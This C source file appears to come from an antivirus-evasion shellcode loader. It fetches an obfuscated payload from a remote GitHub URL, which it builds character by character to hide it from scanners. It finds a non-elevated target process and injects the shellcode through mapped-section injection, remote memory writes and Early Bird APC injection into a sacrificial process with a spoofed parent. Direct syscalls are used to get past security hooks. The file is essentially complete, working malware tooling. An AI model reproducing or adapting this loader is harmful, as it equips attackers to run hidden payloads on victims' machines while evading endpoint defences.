#include "Common.h"
#include "SysWhispers.h"
#include "EntropyReducer.h"

#ifdef _DEBUG
#include "Resource.h"
BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize)
{
	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;

	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = g_Api.pFindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		PRINTA("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = g_Api.pLoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		PRINTA("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get the address of our payload in .rsrc section
	*ppPayloadAddress = g_Api.pLockResource(hGlobal);
	if (*ppPayloadAddress == NULL) {
		// in case of function failure 
		PRINTA("[!] LockResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get the size of our payload in .rsrc section
	*pPayloadSize = g_Api.pSizeofResource(NULL, hRsrc);
	if (*pPayloadSize == 0) {
		// in case of function failure 
		PRINTA("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
#endif

// TODO: API hashing
BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize) 
{

	HANDLE		hInternet = NULL, hInternetFile = NULL;
	PBYTE		pBytes = NULL;
	PBYTE		pTmpBytes = NULL;
	DWORD		dwBytesRead = NULL;
	SIZE_T		sSize = NULL; // Used as the total payload size

	// Manually constructing the string to avoid direct memory reference in .data section
	// The original string is "https://raw.githubusercontent.com/aleister1102/BypassingAVs/master/BypassingAVs/shellcode.obfuscated.bin"
	WCHAR url[] = {
	L'h', L't', L't', L'p', L's', L':', L'/', L'/',
	L'r', L'a', L'w', L'.', L'g', L'i', L't', L'h', L'u', L'b', L'u', L's', L'e', L'r', L'c', L'o', L'n', L't', L'e', L'n', L't', L'.', L'c', L'o', L'm', L'/',
	L'a', L'l', L'e', L'i', L's', L't', L'e', L'r', L'1', L'1', L'0', L'2', L'/',
	L'B', L'y', L'p', L'a', L's', L's', L'i', L'n', L'g', L'A', L'V', L's', L'/',
	L'm', L'a', L's', L't', L'e', L'r', L'/',
	L'B', L'y', L'p', L'a', L's', L's', L'i', L'n', L'g', L'A', L'V', L's', L'/',
	L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L'.', L'o', L'b', L'f', L'u', L's', L'c', L'a', L't', L'e', L'd', L'.', L'b', L'i', L'n', L'\0'
	};

	HMODULE hWininet = LoadLibraryA("wininet.dll");
	if (!hWininet) {
		PRINTA("Failed to load wininet.dll\n");
		return 1;
	}

	g_Api.pInternetOpenW = (fnInternetOpenW)GetProcAddress(hWininet, "InternetOpenW");
	g_Api.pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddress(hWininet, "InternetCloseHandle");
	g_Api.pInternetOpenUrlW = (fnInternetOpenUrlW)GetProcAddress(hWininet, "InternetOpenUrlW");
	g_Api.pInternetReadFile = (fnInternetReadFile)GetProcAddress(hWininet, "InternetReadFile");
	g_Api.pInternetSetOptionW = (fnInternetSetOptionW)GetProcAddress(hWininet, "InternetSetOptionW");

	if (!g_Api.pInternetOpenW || !g_Api.pInternetCloseHandle || !g_Api.pInternetOpenUrlW || !g_Api.pInternetReadFile || !g_Api.pInternetSetOptionW) {
		PRINTA("Failed to get function addresses\n");
		// TODO: use API hashing for this function
		FreeLibrary(hWininet);
		return 1;
	}

	// Opening an internet session handle
	hInternet = g_Api.pInternetOpenW(NULL, NULL, NULL, NULL, NULL);

	// Opening a handle to the payload's URL
	hInternetFile = g_Api.pInternetOpenUrlW(
		hInternet,
		url,
		NULL,
		NULL,
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
		NULL
	);

	// Dynamic memory allocation for the payload
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		goto _EndOfFunction;
	}

	while (TRUE) {
		// Reading the payload from the URL to the temporary buffer
		if (!g_Api.pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// Summing the bytes read to the total size
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		// In case of memory allocation failure
		if (pBytes == NULL) {
			goto _EndOfFunction;
		}

		// Copy the bytes read from the temporary buffer to the main buffer
		CopyMemoryEx((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Zeroing the temporary buffer
		ZeroMemoryEx(pTmpBytes, dwBytesRead);

		// If the bytes read are less than 1024, then break the loop as we reached the end of the payload
		if (dwBytesRead < 1024) {
			*ppPayloadAddress = pBytes;
			*pPayloadSize = sSize;
			break;
		}
	}

	return TRUE;

_EndOfFunction:
	g_Api.pInternetCloseHandle(hInternetFile);
	g_Api.pInternetCloseHandle(hInternet);
	g_Api.pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);
	LocalFree(pBytes);
	return FALSE;
}

BOOL IsProcessElevated(HANDLE hProcess) {
	NTSTATUS		status = 0;
	HANDLE			hToken = NULL;
	TOKEN_ELEVATION elevation = { 0 };
	ULONG			dwSize = 0;

	WhisperHell(g_SyscallsTable.NtOpenProcessToken.wSystemCall);
	if ((status = NtOpenProcessToken(
		hProcess,
		TOKEN_QUERY,
		&hToken))
		!= 0x0) {
		PRINTA("[!] NtOpenProcessToken Failed With Error : 0x%0.8X \n", GetLastError());
		return FALSE;  // Assume not elevated if we can't open the token
	}

	WhisperHell(g_SyscallsTable.NtQueryInformationToken.wSystemCall);
	if ((status = NtQueryInformationToken(
		hToken,
		TokenElevation,
		&elevation,
		(ULONG)sizeof(elevation),
		&dwSize))
		!= 0x0) {
		PRINTA("[!] GetTokenInformation Failed With Error : 0x%0.8X \n", GetLastError());
		WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
		if (NtClose(hToken) != 0x0) {
			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", GetLastError());
		}
		return FALSE;
	}

	WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
	if (NtClose(hToken) != 0x0) {
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	return elevation.TokenIsElevated;
}

BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDLE* phProcess)
{
	ULONG							uReturnLen1 = 0;
	ULONG							uReturnLen2 = 0;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	NTSTATUS						status = 0;

	// First NtQuerySystemInformation call
	// This will fail with STATUS_INFO_LENGTH_MISMATCH
	// But it will provide information about how much memory to allocate (uReturnLen1)
	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
	NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
	if (SystemProcInfo == NULL) {
		PRINTA("[!] HeapAlloc Failed With Error : 0x%0.8X\n", GetLastError());
		return FALSE;
	}

	// Second NtQuerySystemInformation call
	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
	if ((status = NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
		PRINTA("[!] NtQuerySystemInformation [SystemProcessInformation] Failed With Error :  0x%0.8X\n", status);
		return FALSE;
	}
	PRINTA("[+] Retrieved SystemProcInfo Structure At %p with Actual Retrieved Size: %d\n", SystemProcInfo, uReturnLen2);

	// Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
	PSYSTEM_PROCESS_INFORMATION pValueToFree = SystemProcInfo;

	// 'SystemProcInfo' will now represent a new element in the array
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	while (TRUE) {
		PRINTW(L"[i] Checking Process Name: %ws\n", SystemProcInfo->ImageName.Buffer);

		// Small check for the process's name size
		// Comparing the enumerated process name to what we want to target
		if (SystemProcInfo->ImageName.Length && IsStringEqual(pwstrProcName, SystemProcInfo->ImageName.Buffer) == TRUE) {
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			/// ERROR: If the process has higher privileges than the current process, OpenProcess will fail and phProcess will be NULL
			//*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			//break;

			/// INFO: PROCESS_QUERY_LIMITED_INFORMATION allows querying limited details about the process without requiring full access rights.
			HANDLE hProcess = g_Api.pOpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			if (hProcess) {
				if (!IsProcessElevated(hProcess)) {  // Check if process is non-elevated
					*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
					*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
					break;
				}
				WhisperHell(g_SyscallsTable.NtClose.wSystemCall); // Close handle if elevated
				if ((status = NtClose(hProcess)) != 0x0) {
					PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
					return FALSE;
				}
			}
		}

		// If NextEntryOffset is 0, we reached the end of the array
		if (SystemProcInfo->NextEntryOffset == 0)
			break;

		// Move to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Check if we successfully got the target process handle
	if (*pdwPid == 0 || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bIsLocalInjection) {
	// Init local vars
	NTSTATUS		status = 0x0;
	HANDLE          hSection = NULL, hThread = NULL;
	PVOID			pAllocatedAddress = NULL;
	PVOID			pAllocatedRemoteAddress = NULL;
	PVOID			pExecAddress = NULL;
	LARGE_INTEGER	liMaxSize = { .LowPart = (DWORD)sPayloadSize };
	SIZE_T          sViewSize = 0;
	DWORD           dwLocalFlag = bIsLocalInjection ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;

	// Allocating local map view
	WhisperHell(g_SyscallsTable.NtCreateSection.wSystemCall);
	if ((status = NtCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		&liMaxSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	)) != 0) {
		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}
	WhisperHell(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
	if ((status = NtMapViewOfSection(
		hSection,
		GetCurrentProcessHandle(),
		&pAllocatedAddress,
		NULL, NULL, NULL,
		&sViewSize,
		ViewShare,
		NULL,
		dwLocalFlag
	)) != 0) {
		PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}
	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedAddress, (INT)sViewSize);

	// Writing the payload
	PRINTA("[#] Press <Enter> To Write The Payload ... ");
	GETCHAR();

	CopyMemoryEx(pAllocatedAddress, pPayload, sPayloadSize);
	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAllocatedAddress);

	// Allocating remote map view 
	if (!bIsLocalInjection) {
		WhisperHell(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
		if ((status = NtMapViewOfSection(
			hSection,
			hProcess,
			&pAllocatedRemoteAddress,
			NULL, NULL, NULL,
			&sViewSize,
			ViewShare,
			NULL,
			PAGE_EXECUTE_READWRITE
		)) != 0x0) {
			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
			return FALSE;
		}
		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
	}

	// Executing the payload via thread creation
	pExecAddress = pAllocatedAddress;
	if (!bIsLocalInjection) {
		pExecAddress = pAllocatedRemoteAddress;
	}

	PRINTA("[#] Press <Enter> To Run The Payload ... ");
	GETCHAR();

	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
	WhisperHell(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
	if ((status = NtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		hProcess,
		pExecAddress,
		NULL,
		NULL,
		NULL, NULL, NULL,
		NULL
	)) != 0x0) {
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}
	if (hThread != 0x0) {
		PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
	}

	// Waiting for the thread to finish
	WhisperHell(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
	if ((status = NtWaitForSingleObject(
		hThread,
		FALSE,
		NULL
	)) != 0x0) {
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Unmapping the local view
	WhisperHell(g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
	if ((status = NtUnmapViewOfSection(
		hProcess,
		pAllocatedAddress
	)) != 0x0) {
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Closing the section handle
	WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
	if ((status = NtClose(
		hSection
	)) != 0x0) {
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	return TRUE;
}

BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
{
	CHAR                               lpPath[MAX_PATH * 2];
	CHAR                               WnDr[MAX_PATH];

	SIZE_T                             sThreadAttList = 0;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;

	STARTUPINFOEXA                     SiEx = { 0 };
	PROCESS_INFORMATION                Pi = { 0 };

	ZeroMemoryEx(&SiEx, sizeof(STARTUPINFOEXA));
	ZeroMemoryEx(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!g_Api.pGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		PRINTA("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wsprintfA(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	PRINTA("[i] Creating Process With Path : %s \n", lpPath);

	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
	g_Api.pInitializeProcThreadAttributeList(
		NULL,
		1,
		NULL,
		&sThreadAttList);

	// Allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!g_Api.pInitializeProcThreadAttributeList(
		pThreadAttList,
		1,
		NULL,
		&sThreadAttList)) {
		PRINTA("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!g_Api.pUpdateProcThreadAttribute(
		pThreadAttList,
		NULL,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&hParentProcess,
		sizeof(HANDLE),
		NULL,
		NULL)) {
		PRINTA("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
	// created using UpdateProcThreadAttribute - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

	if (!g_Api.pCreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT | DEBUG_PROCESS,
		NULL,
		NULL,
		&SiEx,
		&Pi)) {
		PRINTA("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Cleaning up
	g_Api.pDeleteProcThreadAttributeList(pThreadAttList);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, OUT PVOID* ppInjectedShellcodeAddress)
{
	NTSTATUS	status = 0;
	PVOID		pShellcodeAddress = NULL;
	SIZE_T		sNumberOfBytesAllocated = sSizeOfShellcode;
	SIZE_T		sNumberOfBytesWritten = NULL;
	DWORD		dwOldProtection = NULL;

	// Allocate memory in the remote process of size sSizeOfShellcode
	WhisperHell(g_SyscallsTable.NtAllocateVirtualMemory.wSystemCall);
	if ((status = NtAllocateVirtualMemory(
		hProcess,
		&pShellcodeAddress,
		0,
		&sNumberOfBytesAllocated,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE))
		!= 0x0) {
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	PRINTA("[+] Allocated Memory At : 0x%p With Allocated Size: %d \n", pShellcodeAddress, (DWORD)sNumberOfBytesAllocated);


	PRINTA("[#] Press <Enter> To Write Payload ... \n");
	GETCHAR();

	// Write the shellcode in the allocated memory
	WhisperHell(g_SyscallsTable.NtWriteVirtualMemory.wSystemCall);
	if ((status = NtWriteVirtualMemory(
		hProcess,
		pShellcodeAddress,
		pShellcode,
		sSizeOfShellcode,
		&sNumberOfBytesWritten)) != 0x0 ||
		sNumberOfBytesWritten != sSizeOfShellcode) {
		PRINTA("[!] NtWriteVirtualMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	PRINTA("[+] Successfully Written %d Bytes\n", (DWORD)sNumberOfBytesWritten);

	ZeroMemoryEx(pShellcode, sSizeOfShellcode);

	// Make the memory region executable
	WhisperHell(g_SyscallsTable.NtProtectVirtualMemory.wSystemCall);
	if ((status = NtProtectVirtualMemory(
		hProcess,
		&pShellcodeAddress,
		&sNumberOfBytesWritten,
		PAGE_EXECUTE_READWRITE,
		&dwOldProtection))
		!= 0x0) {
		PRINTA("[!] NtProtectVirtualMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	*ppInjectedShellcodeAddress = pShellcodeAddress;

	return TRUE;
}

BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSacrificalProcessName, PVOID pShellcodeAddress, SIZE_T sSizeOfShellcode)
{
	NTSTATUS	status = 0;
	HANDLE		hProcess = NULL, hThread = NULL, hDebugObject = NULL;
	DWORD		dwProcessId = 0;
	PVOID		pInjectedAddress = NULL;
	SIZE_T		sInjectedSize = sSizeOfShellcode;
	ULONG		uReturnedLength = 0;

	// Create the sacrificial process
	if (!CreatePpidSpoofedProcessWithAlertableThread(hParentProcess, pstrSacrificalProcessName, &dwProcessId, &hProcess, &hThread)) {
		PRINTA("[!] CreatePPidSpoofedAndSuspendedProcess Failed With Error : %d \n", GetLastError());
		return -1;
	}
	PRINTA("[+] Created Sacrificial Process: %s with PID: %d And Handle: %p!\n", pstrSacrificalProcessName, dwProcessId, hProcess);

	PRINTA("[#] Press <Enter> To Inject Shellcode ... \n");
	GETCHAR();

	// Inject the shellcode to the sacrificial process
	if (!InjectShellcodeToRemoteProcess(hProcess, pShellcodeAddress, sSizeOfShellcode, &pInjectedAddress)) {
		PRINTA("[!] InjectShellcodeToRemoteProcess Failed With Error : %d \n", GetLastError());
		return -1;
	}
	PRINTA("[+] Shellcode Injected At : 0x%p \n", pInjectedAddress);
	PRINTA("[#] Press <Enter> To Queue The APC ... \n");
	GETCHAR();

	// Queue the APC to the thread
	WhisperHell(g_SyscallsTable.NtQueueApcThread.wSystemCall);
	if ((status = NtQueueApcThread(
		hThread,
		(PAPCFUNC)pInjectedAddress,
		NULL, NULL, NULL))
		!= 0x0) {
		PRINTA("[!] NtQueueApcThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	PRINTA("[+] APC Queued Successfully To Thread With TID : %d\n", GetThreadId(hThread));

	// Get debug object handle for detaching the debugger
	//? We only invoke it once as we know the size of the returned bytes is the size of a HANDLE
	WhisperHell(g_SyscallsTable.NtQueryInformationProcess.wSystemCall);
	if ((status = NtQueryInformationProcess(
		hProcess,
		ProcessDebugObjectHandle,
		&hDebugObject,
		sizeof(HANDLE),
		&uReturnedLength))
		!= 0x0) {
		PRINTA("[!] NtQueryInformationProcess [ProcessDebugObjectHandle] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Detach the debugger
	WhisperHell(g_SyscallsTable.NtRemoveProcessDebug.wSystemCall);
	if ((status = NtRemoveProcessDebug(
		hProcess,
		hDebugObject))
		!= 0x0) {
		PRINTA("[!] NtRemoveProcessDebug Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	//Resume the thread in case we use the CREATE_SUSPENDED flag
	//ResumeThread(hThread);

	WhisperHell(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
	if (NtWaitForSingleObject(hThread, FALSE, NULL) != 0x0) {
		PRINTA("[!] NtWaitForSingleObject Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Clean up
	//! This will fail if the process is terminated, typically when the shellcode is executed successfully
	//! So we will ignore the return value
	WhisperHell(g_SyscallsTable.NtFreeVirtualMemory.wSystemCall);
	if ((status = NtFreeVirtualMemory(
		hProcess,
		&pInjectedAddress,
		&sInjectedSize,
		MEM_RELEASE))
		!= 0x0) {
		PRINTA("[!] VirtualFreeEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}